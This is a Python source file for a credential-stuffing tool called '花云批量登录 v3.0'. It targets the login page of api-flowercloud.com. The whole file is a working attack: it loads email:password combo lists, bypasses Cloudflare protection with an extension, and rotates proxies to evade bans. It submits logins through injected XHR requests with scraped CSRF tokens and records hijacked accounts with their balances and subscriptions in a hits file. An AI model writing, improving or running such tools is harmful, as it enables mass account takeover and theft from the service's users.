# -*- coding: utf-8 -*-
"""
============================================================
  花云批量登录 - 多代理多窗口版 v3.0 (DrissionPage + XHR)
============================================================
  功能:
  1. GUI选择过盾插件路径,自动加载到每个Chrome
  2. 启动前验证: 插件加载成功 + 代理能打开花云页面
  3. 代理预检测: 逐个验证能否访问花云,筛选可用代理
  4. 每个IP跑30条后自动换下一个未用过的IP
  5. 被ban时自动换IP+刷新过盾
  6. combo队列分发,不重复不遗漏
============================================================
"""
import sys
import os
import time
import random
import re
import threading
import queue
import gc

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] pip install DrissionPage")
    sys.exit(1)

try:
    import customtkinter as ctk
    from tkinter import filedialog, messagebox
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

from proxy_checker import Proxy, load_proxies_from_file

# ============ 配置 ============
TARGET_BASE = "https://api-flowercloud.com"
TARGET_PAGE = TARGET_BASE + "/clientarea.php"

COMBO_FILE = "combo_f.txt"
PROXY_FILE = "alive_proxies.txt"
GOOD_FILE = "hits.txt"
PROGRESS_FILE = "progress.txt"

COMBO_PER_IP = 30
DELAY_PER_REQ = 2.0
BAN_WAIT = 180
CF_WAIT_MAX = 120
TOKEN_REFRESH_EVERY = 25
MAX_WORKERS = 3
BASE_PORT = 9300



# ============ 工具函数 ============
def save_result(filename, content):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(content + "\n")

def page_is_ready(page):
    try:
        return len(page.html) > 10000
    except Exception:
        return False

def is_banned(page):
    try:
        html = page.html
        if len(html) < 3000:
            h = html.lower()
            if "403 forbidden" in h or "openresty" in h or "429" in h or "been blocked" in h:
                return True
        return False
    except Exception:
        return False

def has_login_form(page):
    try:
        return page.run_js(
            "return !!(document.querySelector('#inputEmail') || "
            "document.querySelector('input[name=\"username\"]') || "
            "document.querySelector('input[type=\"email\"]'))")
    except Exception:
        return False

def is_logged_in(page):
    try:
        return "logout.php" in page.html.lower()
    except Exception:
        return False

def wait_cf_pass(page, max_wait=CF_WAIT_MAX):
    start = time.time()
    while time.time() - start < max_wait:
        if page_is_ready(page):
            return True
        if is_banned(page):
            return False
        time.sleep(3)
    return page_is_ready(page)

def logout_force(page):
    try:
        page.run_js("try{var x=new XMLHttpRequest();x.open('GET','/logout.php',false);x.send();}catch(e){}")
    except Exception:
        pass
    time.sleep(0.5)

def reload_form_silent(page):
    js = """
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/clientarea.php', false);
        xhr.send();
        if(xhr.status === 403 || xhr.status === 429) return 'banned';
        var html = xhr.responseText || '';
        var m = html.match(/name="token"\\s*value="([^"]+)"/);
        if(!m) m = html.match(/name='token'\\s*value='([^']+)'/);
        if(m && m[1]) {
            var el = document.querySelector('input[name="token"]');
            if(el) { el.value = m[1]; }
            return 'ok';
        }
        return 'no_token';
    } catch(e) { return 'error'; }
    """
    try:
        return page.run_js(js) == "ok"
    except Exception:
        return False

def do_login_xhr(page, email, password):
    js = """
    var token = '';
    var tokenEl = document.querySelector('input[name="token"]');
    if(tokenEl) token = tokenEl.value;
    if(!token) { var cv = (typeof csrfToken !== 'undefined') ? csrfToken : ''; token = cv; }
    if(!token) {
        try {
            var pre = new XMLHttpRequest();
            pre.open('GET', '/clientarea.php', false);
            pre.send();
            if(pre.status === 403 || pre.status === 429) return 'banned:pre';
            var preHtml = pre.responseText || '';
            if(preHtml.indexOf('logout.php') !== -1) return 'need_logout';
            var tm = preHtml.match(/name="token"\\s*value="([^"]+)"/);
            if(!tm) tm = preHtml.match(/name='token'\\s*value='([^']+)'/);
            if(tm && tm[1]) { token = tm[1]; if(tokenEl) tokenEl.value = token; }
        } catch(e) {}
    }
    if(!token) return 'error:no_token';
    var body = 'token=' + encodeURIComponent(token) + '&username=' + encodeURIComponent(arguments[0]) + '&password=' + encodeURIComponent(arguments[1]);
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/dologin.php', false);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(body);
        var status = xhr.status;
        if(status === 403 || status === 429) return 'banned:' + status;
        var html = xhr.responseText || '';
        var url = xhr.responseURL || '';
        if(url.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('logout.php') !== -1) return 'good:' + html.substring(0, 15000);
        return 'bad';
    } catch(e) { return 'error:' + e.message; }
    """
    try:
        return page.run_js(js, email, password)
    except Exception:
        return "js_error"

def extract_info_from_html(html):
    info = {"balance": "unknown", "services": "0", "products": []}
    try:
        m = re.search(r'可用余额.*?<h3[^>]*>(.*?)</h3>', html, re.DOTALL)
        if m: info["balance"] = m.group(1).strip()
        m = re.search(r'action=services[^>]*>产品服务</a>\s*<span[^>]*>(\d+)</span>', html, re.DOTALL)
        if m: info["services"] = m.group(1)
        products = re.findall(r'action=productdetails&(?:amp;)?id=(\d+)">\s*<span class="cell-title">([^<]+)</span>', html)
        for pid, pname in products:
            expire = "unknown"
            em = re.search(r'id=' + pid + r'.*?到期时间:\s*</span>\s*([\d\-]+)', html, re.DOTALL)
            if em: expire = em.group(1)
            info["products"].append({"id": pid, "name": pname.strip(), "expire": expire})
    except Exception:
        pass
    return info

def format_info(info):
    parts = ["balance=" + info["balance"], "services=" + info["services"]]
    for p in info["products"]:
        parts.append(p["name"] + "(id=" + p["id"] + ",exp=" + p["expire"] + ")")
    return " | ".join(parts)



# ============================================================
# 代理管理器 - 不重复不遗漏
# ============================================================
class ProxyManager:
    """线程安全的代理管理: 每个代理只用一次,用完标记"""

    def __init__(self, proxies):
        self.all_proxies = list(proxies)
        self.available = queue.Queue()
        self.used = set()
        self.lock = threading.Lock()
        for p in self.all_proxies:
            self.available.put(p)

    def get_next(self):
        """获取下一个未使用的代理, 无可用则返回None"""
        try:
            proxy = self.available.get_nowait()
            with self.lock:
                self.used.add(proxy.to_url())
            return proxy
        except queue.Empty:
            return None

    def return_proxy(self, proxy):
        """归还代理(如果需要重用)"""
        with self.lock:
            url = proxy.to_url()
            if url in self.used:
                self.used.discard(url)
            self.available.put(proxy)

    def remaining(self):
        return self.available.qsize()

    def total(self):
        return len(self.all_proxies)



# ============================================================
# 单窗口Worker
# ============================================================
class WindowWorker:
    """独立窗口: 自己的Chrome+代理+Cookie, 从队列取combo"""

    def __init__(self, worker_id, proxy_manager, combo_queue, result_lock,
                 stats, extension_path="", log_func=None):
        self.worker_id = worker_id
        self.proxy_manager = proxy_manager
        self.combo_queue = combo_queue
        self.result_lock = result_lock
        self.stats = stats
        self.extension_path = extension_path
        self.log_func = log_func
        self.page = None
        self.port = BASE_PORT + worker_id
        self.current_proxy = None
        self.running = True
        self.combo_count_on_ip = 0

    def log(self, msg):
        full = f"[W{self.worker_id}] {msg}"
        if self.log_func:
            self.log_func(full)
        else:
            print(full, flush=True)

    def start_browser_with_proxy(self, proxy):
        """启动Chrome: 加载过盾插件 + 设置代理"""
        self.close_browser()
        self.current_proxy = proxy
        self.combo_count_on_ip = 0
        try:
            co = ChromiumOptions()
            co.set_local_port(self.port)
            co.set_argument('--no-first-run')
            co.set_argument('--no-default-browser-check')
            co.set_argument('--disable-infobars')
            co.set_argument('--disable-gpu')
            co.set_argument('--disable-dev-shm-usage')
            co.set_argument('--no-sandbox')
            co.set_argument('--disable-background-networking')
            co.set_argument('--disable-sync')
            co.set_argument('--disable-translate')

            # 加载过盾插件
            if self.extension_path and os.path.isdir(self.extension_path):
                co.set_argument(f'--load-extension={self.extension_path}')
                co.set_argument(f'--disable-extensions-except={self.extension_path}')

            # 设置代理
            if proxy:
                co.set_argument(f'--proxy-server={proxy.to_selenium_arg()}')

            self.log(f"启动Chrome 端口{self.port} 代理:{proxy.to_url() if proxy else '直连'}")
            self.page = ChromiumPage(co)
            return True
        except Exception as e:
            self.log(f"启动失败: {e}")
            return False

    def close_browser(self):
        try:
            if self.page:
                self.page.quit()
        except Exception:
            pass
        self.page = None
        gc.collect()

    def verify_extension_loaded(self):
        """验证过盾插件已加载"""
        if not self.extension_path:
            return True  # 没有插件则跳过验证
        try:
            # 检查 chrome://extensions 或通过页面行为判断
            self.page.get("chrome://extensions/")
            time.sleep(2)
            html = self.page.html
            # 如果插件目录名出现在extensions页就算加载成功
            ext_name = os.path.basename(self.extension_path)
            if ext_name.lower() in html.lower() or "已启用" in html or "enabled" in html.lower():
                self.log("过盾插件已加载 ✓")
                return True
            # 备用: 检查是否有任何扩展
            if "extension" in html.lower() and len(html) > 1000:
                self.log("检测到扩展已加载 ✓")
                return True
            self.log("警告: 未确认插件加载,继续尝试...")
            return True  # 不阻塞,继续尝试
        except Exception:
            return True  # 出错也继续

    def init_page_and_verify(self):
        """打开花云页面, 等过盾, 验证能正常登录"""
        if not self.page:
            return False
        try:
            self.page.get(TARGET_PAGE)
            time.sleep(5)

            if is_banned(self.page):
                self.log("此IP已被封")
                return False

            if not page_is_ready(self.page):
                self.log("等待过盾...")
                if not wait_cf_pass(self.page, CF_WAIT_MAX):
                    self.log("过盾失败")
                    return False

            if is_logged_in(self.page):
                logout_force(self.page)
                time.sleep(1)

            if has_login_form(self.page) or reload_form_silent(self.page):
                self.log("页面就绪,可以开始登录 ✓")
                return True

            self.log("无法获取登录表单")
            return False
        except Exception as e:
            self.log(f"init异常: {e}")
            return False

    def switch_to_next_ip(self):
        """切换到下一个未使用过的IP"""
        self.close_browser()
        proxy = self.proxy_manager.get_next()
        if not proxy:
            self.log("没有更多可用代理了!")
            return False

        # 启动新浏览器
        if not self.start_browser_with_proxy(proxy):
            return self.switch_to_next_ip()  # 递归尝试下一个

        # 验证插件
        self.verify_extension_loaded()

        # 验证能打开花云
        if not self.init_page_and_verify():
            self.log(f"代理 {proxy.to_url()} 无法访问花云,换下一个")
            self.close_browser()
            return self.switch_to_next_ip()

        return True

    def handle_ban(self):
        """被封处理: 等180s + 换到新IP"""
        with self.result_lock:
            self.stats["bans"] += 1

        self.log(f"被封! 等{BAN_WAIT}s后换新IP...")
        waited = 0
        while waited < BAN_WAIT and self.running:
            chunk = min(30, BAN_WAIT - waited)
            time.sleep(chunk)
            waited += chunk
            if BAN_WAIT - waited > 0:
                self.log(f"  等待中...剩{BAN_WAIT - waited}s")

        if not self.running:
            return False
        return self.switch_to_next_ip()

    def run(self):
        """主循环"""
        # 获取第一个代理并启动
        if not self.switch_to_next_ip():
            self.log("无法获取可用代理,退出")
            return

        batch_count = 0

        while self.running:
            # 取combo
            try:
                idx, email, password = self.combo_queue.get_nowait()
            except queue.Empty:
                break

            # 检查是否需要换IP (每30条)
            if self.combo_count_on_ip >= COMBO_PER_IP:
                self.log(f"已跑{self.combo_count_on_ip}条,换新IP...")
                if not self.switch_to_next_ip():
                    self.combo_queue.put((idx, email, password))
                    self.log("无更多代理,退出")
                    break

            # 定期刷新token
            if batch_count > 0 and batch_count % TOKEN_REFRESH_EVERY == 0:
                if not reload_form_silent(self.page):
                    self.page.get(TARGET_PAGE)
                    time.sleep(5)
                    if not page_is_ready(self.page):
                        wait_cf_pass(self.page, 60)
                    if is_logged_in(self.page):
                        logout_force(self.page)
                        time.sleep(1)

            # 执行登录
            result = do_login_xhr(self.page, email, password)

            if result == "need_logout":
                logout_force(self.page)
                time.sleep(1)
                reload_form_silent(self.page)
                result = do_login_xhr(self.page, email, password)

            # 被封
            if isinstance(result, str) and result.startswith("banned:"):
                self.log(f"[{idx+1}] {email} -> BANNED!")
                if not self.handle_ban():
                    self.combo_queue.put((idx, email, password))
                    break
                result = do_login_xhr(self.page, email, password)
                if result == "need_logout":
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)
                    result = do_login_xhr(self.page, email, password)
                if isinstance(result, str) and result.startswith("banned:"):
                    self.combo_queue.put((idx, email, password))
                    if not self.handle_ban():
                        break
                    continue

            # 处理结果
            self.combo_count_on_ip += 1
            batch_count += 1

            with self.result_lock:
                self.stats["processed"] += 1
                if isinstance(result, str) and result.startswith("good:"):
                    self.stats["hits"] += 1
                    html = result[5:]
                    info = extract_info_from_html(html)
                    svc = int(info["services"]) if info["services"].isdigit() else 0
                    tag = f"HIT[SUB={info['services']}]" if svc > 0 else "HIT[NOSUB]"
                    self.log(f"[{idx+1}] {email} -> {tag} {info['balance']}")
                    for p in info["products"]:
                        self.log(f"    -> {p['name']} exp:{p['expire']}")
                    save_result(GOOD_FILE, f"{email}:{password} | {format_info(info)}")
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)
                elif result == "bad":
                    self.stats["failed"] += 1
                    self.log(f"[{idx+1}] {email} -> 失败")
                else:
                    self.stats["errors"] += 1
                    self.log(f"[{idx+1}] {email} -> err:{str(result)[:40]}")
                    if isinstance(result, str) and "no_token" in result:
                        reload_form_silent(self.page)

            time.sleep(random.uniform(DELAY_PER_REQ * 0.85, DELAY_PER_REQ * 1.15))

        self.log("工作结束")
        self.close_browser()



# ============================================================
# 多窗口调度引擎
# ============================================================
class MultiWindowEngine:
    def __init__(self, proxies, combos, max_workers=MAX_WORKERS,
                 extension_path="", log_func=None):
        self.proxy_manager = ProxyManager(proxies)
        self.combos = combos
        self.max_workers = max_workers
        self.extension_path = extension_path
        self.log_func = log_func

        self.combo_queue = queue.Queue()
        self.result_lock = threading.Lock()
        self.stats = {"processed": 0, "hits": 0, "failed": 0, "errors": 0, "bans": 0, "total": len(combos)}
        self.workers = []
        self.threads = []
        self.running = False

    def log(self, msg):
        if self.log_func:
            self.log_func(msg)
        else:
            print(msg, flush=True)

    def start(self):
        self.running = True
        for i, (email, password) in enumerate(self.combos):
            self.combo_queue.put((i, email, password))

        self.log(f"[引擎] Combo: {len(self.combos)} | 代理: {self.proxy_manager.total()} | 窗口: {self.max_workers}")
        self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条 | 过盾插件: {'已设置' if self.extension_path else '未设置'}")

        for wid in range(self.max_workers):
            worker = WindowWorker(
                worker_id=wid,
                proxy_manager=self.proxy_manager,
                combo_queue=self.combo_queue,
                result_lock=self.result_lock,
                stats=self.stats,
                extension_path=self.extension_path,
                log_func=self.log_func
            )
            self.workers.append(worker)
            t = threading.Thread(target=worker.run, daemon=True)
            self.threads.append(t)
            t.start()
            time.sleep(5)  # 错开启动

        threading.Thread(target=self._monitor, daemon=True).start()

    def stop(self):
        self.running = False
        for w in self.workers:
            w.running = False
        self.log("[引擎] 停止中...")

    def _monitor(self):
        for t in self.threads:
            t.join()
        self.running = False
        s = self.stats
        self.log("\n" + "=" * 50)
        self.log(f"  完成! 处理:{s['processed']}/{s['total']}")
        self.log(f"  击中:{s['hits']} 失败:{s['failed']} 错误:{s['errors']} 封禁:{s['bans']}")
        self.log("=" * 50)


# ============================================================
# GUI 界面
# ============================================================
if HAS_GUI:
    class FlowerLoginApp(ctk.CTk):
        def __init__(self):
            super().__init__()
            self.title("花云批量登录 v3.0 - 多代理多窗口")
            self.geometry("1100x750")
            self.minsize(1000, 650)
            ctk.set_appearance_mode("dark")
            ctk.set_default_color_theme("blue")
            self.engine = None
            self._build_ui()

        def _build_ui(self):
            top = ctk.CTkFrame(self)
            top.pack(fill="x", padx=10, pady=(10, 5))

            # Row 1: 过盾插件路径
            r0 = ctk.CTkFrame(top, fg_color="transparent")
            r0.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r0, text="过盾插件路径:", font=("", 12, "bold")).pack(side="left")
            self.ext_var = ctk.StringVar(value="")
            ctk.CTkEntry(r0, textvariable=self.ext_var, width=500, placeholder_text="选择CloudflareBypass插件文件夹路径").pack(side="left", padx=5)
            ctk.CTkButton(r0, text="选择文件夹", width=90, command=self._pick_ext).pack(side="left")

            # Row 2: 文件选择
            r1 = ctk.CTkFrame(top, fg_color="transparent")
            r1.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r1, text="代理文件:").pack(side="left")
            self.proxy_var = ctk.StringVar(value="")
            ctk.CTkEntry(r1, textvariable=self.proxy_var, width=200).pack(side="left", padx=5)
            ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_proxy).pack(side="left", padx=(0, 15))
            ctk.CTkLabel(r1, text="Combo:").pack(side="left")
            self.combo_var = ctk.StringVar(value="combo_f.txt")
            ctk.CTkEntry(r1, textvariable=self.combo_var, width=200).pack(side="left", padx=5)
            ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_combo).pack(side="left")

            # Row 3: 参数
            r2 = ctk.CTkFrame(top, fg_color="transparent")
            r2.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r2, text="窗口数:").pack(side="left")
            self.workers_var = ctk.StringVar(value="3")
            ctk.CTkEntry(r2, textvariable=self.workers_var, width=40).pack(side="left", padx=(5, 15))
            ctk.CTkLabel(r2, text="每IP条数:").pack(side="left")
            self.per_ip_var = ctk.StringVar(value="30")
            ctk.CTkEntry(r2, textvariable=self.per_ip_var, width=40).pack(side="left", padx=(5, 15))

            # Row 4: 按钮
            r3 = ctk.CTkFrame(top, fg_color="transparent")
            r3.pack(fill="x", padx=10, pady=4)
            self.btn_start = ctk.CTkButton(r3, text="开始运行", width=100, fg_color="#4CAF50", command=self._start)
            self.btn_start.pack(side="left", padx=5)
            self.btn_stop = ctk.CTkButton(r3, text="停止", width=80, fg_color="#F44336", command=self._stop)
            self.btn_stop.pack(side="left", padx=5)
            self.status_lbl = ctk.CTkLabel(r3, text="就绪 - 请先选择过盾插件路径", text_color="#FFEB3B", font=("", 12, "bold"))
            self.status_lbl.pack(side="right", padx=10)

            # 统计
            info = ctk.CTkFrame(self)
            info.pack(fill="x", padx=10, pady=5)
            self.lbl_progress = ctk.CTkLabel(info, text="进度: 0/0")
            self.lbl_progress.pack(side="left", padx=10)
            self.lbl_hits = ctk.CTkLabel(info, text="击中: 0", text_color="#00E676", font=("", 12, "bold"))
            self.lbl_hits.pack(side="left", padx=10)
            self.lbl_failed = ctk.CTkLabel(info, text="失败: 0")
            self.lbl_failed.pack(side="left", padx=10)
            self.lbl_bans = ctk.CTkLabel(info, text="封禁: 0", text_color="#FF9800")
            self.lbl_bans.pack(side="left", padx=10)
            self.lbl_proxies = ctk.CTkLabel(info, text="剩余代理: 0")
            self.lbl_proxies.pack(side="left", padx=10)

            # 进度条
            self.pbar = ctk.CTkProgressBar(self, height=8)
            self.pbar.pack(fill="x", padx=10, pady=4)
            self.pbar.set(0)

            # 日志
            lf = ctk.CTkFrame(self)
            lf.pack(fill="both", expand=True, padx=10, pady=(5, 10))
            self.log_box = ctk.CTkTextbox(lf, font=("Consolas", 11))
            self.log_box.pack(fill="both", expand=True, padx=5, pady=5)

            self._refresh_stats()

        def _pick_ext(self):
            p = filedialog.askdirectory(title="选择过盾插件文件夹")
            if p:
                self.ext_var.set(p)
                self.status_lbl.configure(text=f"插件路径已设置: {os.path.basename(p)}", text_color="#00E676")

        def _pick_proxy(self):
            p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
            if p: self.proxy_var.set(p)

        def _pick_combo(self):
            p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
            if p: self.combo_var.set(p)

        def _log(self, msg):
            def _do():
                self.log_box.insert("end", msg + "\n")
                self.log_box.see("end")
            self.after(0, _do)

        def _refresh_stats(self):
            if self.engine:
                s = self.engine.stats
                self.lbl_progress.configure(text=f"进度: {s['processed']}/{s['total']}")
                self.lbl_hits.configure(text=f"击中: {s['hits']}")
                self.lbl_failed.configure(text=f"失败: {s['failed']}")
                self.lbl_bans.configure(text=f"封禁: {s['bans']}")
                self.lbl_proxies.configure(text=f"剩余代理: {self.engine.proxy_manager.remaining()}")
                if s['total'] > 0:
                    self.pbar.set(s['processed'] / s['total'])
            self.after(1000, self._refresh_stats)

        def _precheck(self):
            """预检代理: 验证每个代理能打开花云"""
            ext_path = self.ext_var.get()
            if not ext_path:
                messagebox.showwarning("提示", "请先选择过盾插件路径!")
                return
            proxies = load_proxies_from_file(self.proxy_var.get())
            if not proxies:
                messagebox.showwarning("提示", "代理文件为空!")
                return

            self._log(f"[预检] 开始验证 {len(proxies)} 个代理能否访问花云...")
            self.btn_precheck.configure(state="disabled", text="检测中...")
            self.status_lbl.configure(text="代理预检中...", text_color="#FFEB3B")

            def run():
                good = []
                for i, proxy in enumerate(proxies):
                    if not getattr(self, '_precheck_running', True):
                        break
                    self._log(f"  [{i+1}/{len(proxies)}] {proxy.to_url()}...", )
                    ok = precheck_proxy_for_flowercloud(proxy, ext_path)
                    if ok:
                        good.append(proxy)
                        self._log(f"    -> ✓ 可用")
                    else:
                        self._log(f"    -> ✗ 不可用")

                # 保存可用代理
                if good:
                    with open("alive_proxies.txt", "w", encoding="utf-8") as f:
                        for p in good:
                            f.write(p.to_url() + "\n")
                    self._log(f"[预检] 完成! {len(good)}/{len(proxies)} 可用, 已保存到 alive_proxies.txt")
                else:
                    self._log("[预检] 没有可用代理!")

                def update():
                    self.btn_precheck.configure(state="normal", text="预检代理")
                    self.status_lbl.configure(text=f"预检完成: {len(good)}个可用", text_color="#00E676")
                    # 不自动修改代理路径,让用户自己选
                self.after(0, update)

            self._precheck_running = True
            threading.Thread(target=run, daemon=True).start()

        def _start(self):
            ext_path = self.ext_var.get()
            if not ext_path or not os.path.isdir(ext_path):
                messagebox.showwarning("提示", "请先选择过盾插件文件夹路径!")
                return

            proxies = load_proxies_from_file(self.proxy_var.get())
            if not proxies:
                messagebox.showwarning("提示", "代理文件为空!")
                return

            # 加载combo
            combos = []
            combo_path = self.combo_var.get()
            try:
                content = None
                for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
                    try:
                        with open(combo_path, "r", encoding=enc) as f:
                            content = f.read()
                        break
                    except (UnicodeDecodeError, UnicodeError):
                        continue
                if content:
                    for line in content.splitlines():
                        line = line.strip()
                        if line and ":" in line:
                            parts = line.split(":", 1)
                            combos.append((parts[0].strip(), parts[1].strip()))
            except Exception as e:
                messagebox.showwarning("错误", f"加载combo失败: {e}")
                return

            if not combos:
                messagebox.showwarning("提示", "Combo为空!")
                return

            global COMBO_PER_IP
            COMBO_PER_IP = int(self.per_ip_var.get() or 30)
            workers = int(self.workers_var.get() or 3)

            self._log(f"[启动] 代理:{len(proxies)} | Combo:{len(combos)} | 窗口:{workers}")
            self._log(f"[启动] 插件: {os.path.basename(ext_path)}")
            self._log(f"[启动] 每窗口启动前会: 加载插件->验证页面->确认可用->才开始跑")
            self.status_lbl.configure(text="运行中...", text_color="#00E676")
            self.btn_start.configure(state="disabled")

            self.engine = MultiWindowEngine(
                proxies=proxies, combos=combos, max_workers=workers,
                extension_path=ext_path, log_func=self._log
            )
            threading.Thread(target=self.engine.start, daemon=True).start()

        def _stop(self):
            if self.engine:
                self.engine.stop()
            self.status_lbl.configure(text="已停止", text_color="#F44336")
            self.btn_start.configure(state="normal")
            self._log("[停止]")


# ============================================================
# CLI模式
# ============================================================
def run_cli():
    print("\n花云批量登录 - 多代理多窗口 CLI模式\n")
    ext_path = input("过盾插件路径: ").strip()
    if not os.path.isdir(ext_path):
        print("[!] 插件路径无效")
        sys.exit(1)

    proxy_file = input(f"代理文件 (默认 {PROXY_FILE}): ").strip() or PROXY_FILE
    proxies = load_proxies_from_file(proxy_file)
    if not proxies:
        print("[!] 无代理"); sys.exit(1)

    combo_file = input(f"Combo文件 (默认 {COMBO_FILE}): ").strip() or COMBO_FILE
    combos = []
    with open(combo_file, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and ":" in line:
                parts = line.split(":", 1)
                combos.append((parts[0].strip(), parts[1].strip()))
    if not combos:
        print("[!] combo为空"); sys.exit(1)

    workers = int(input(f"窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)
    print(f"\n代理:{len(proxies)} | Combo:{len(combos)} | 窗口:{workers}\n")

    engine = MultiWindowEngine(proxies=proxies, combos=combos, max_workers=workers, extension_path=ext_path)
    engine.start()
    try:
        while engine.running:
            time.sleep(5)
            s = engine.stats
            print(f"  [进度:{s['processed']}/{s['total']} 击中:{s['hits']} 失败:{s['failed']} 封:{s['bans']} 剩余代理:{engine.proxy_manager.remaining()}]")
    except KeyboardInterrupt:
        engine.stop()


# ============================================================
if __name__ == "__main__":
    if HAS_GUI and "--cli" not in sys.argv:
        app = FlowerLoginApp()
        app.mainloop()
    else:
        run_cli()
